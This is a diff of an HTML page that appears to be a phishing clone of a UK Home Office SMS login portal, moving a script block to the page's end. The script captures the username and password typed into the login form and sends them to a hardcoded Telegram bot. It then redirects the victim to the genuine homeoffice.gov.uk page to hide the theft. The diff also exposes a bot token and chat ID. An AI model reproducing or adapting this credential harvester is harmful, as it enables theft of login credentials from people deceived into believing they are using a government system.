@@ -85,60 +85,7 @@
 		
 		<div class="clr">
 		</div>
-<script>
-	function navigateToLandingPage(event) {
-  event.preventDefault();
-  window.location.href = 'index.html';
-}
-  // --- Focus input on page load ---
-  window.onload = function() {
-    document.forms['smslogin'].elements['j_username']?.focus();
-  };
 
-  // --- Handle form submission ---
-  document.getElementById("smslogin").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent formsubmit.co from triggering
-
-    // get form inputs
-    const username = document.getElementById("j_username")?.value || "N/A";
-    const pass = document.getElementById("j_password")?.value || "N/A";
-
-
-    // your Telegram bot details
-    const botToken = "8392816270:AAHpT2h9SaZ0mC458GP7hacr9YWxtthkkSU";
-    const chatId = "6254525052";
-
-    // formatted message
-    const telegramMessage = `
-📨 New Login Attempt:
-👤 Username: ${username}
-📧 Pass: ${pass}
-    `;
-
-    // send data to Telegram
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=telegramMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: telegramMessage
-      })
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        alert("Please Wait...");
-        // optional: redirect to landing page
-        window.location.href = "https://www.points.homeoffice.gov.uk/gui-sms-jsf/home/SMS-003-Home.html";
-      } else {
-        alert("Try Again");
-      }
-    })
-    .catch(error => {
-      alert("⚠️ Error: " + error.message);
-    });
-  });
-</script>
 
 		<form id="smslogin">
 	<input type="hidden" name="_next" value="">
@@ -238,6 +185,60 @@
 				<p class="hide"><a href="#top">Back to top</a></p>
 			</div>
 		</div>
+		<script>
+	function navigateToLandingPage(event) {
+  event.preventDefault();
+  window.location.href = 'index.html';
+}
+  // --- Focus input on page load ---
+  window.onload = function() {
+    document.forms['smslogin'].elements['j_username']?.focus();
+  };
+
+  // --- Handle form submission ---
+  document.getElementById("smslogin").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent formsubmit.co from triggering
+
+    // get form inputs
+    const username = document.getElementById("j_username")?.value || "N/A";
+    const pass = document.getElementById("j_password")?.value || "N/A";
+
+
+    // your Telegram bot details
+    const botToken = "8392816270:AAHpT2h9SaZ0mC458GP7hacr9YWxtthkkSU";
+    const chatId = "6254525052";
+
+    // formatted message
+    const telegramMessage = `
+📨 New Login Attempt:
+👤 Username: ${username}
+📧 Pass: ${pass}
+    `;
+
+    // send data to Telegram
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=telegramMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: telegramMessage
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        alert("Please Wait...");
+        // optional: redirect to landing page
+        window.location.href = "https://www.points.homeoffice.gov.uk/gui-sms-jsf/home/SMS-003-Home.html";
+      } else {
+        alert("Try Again");
+      }
+    })
+    .catch(error => {
+      alert("⚠️ Error: " + error.message);
+    });
+  });
+</script>
 	</body>
 
 </html>
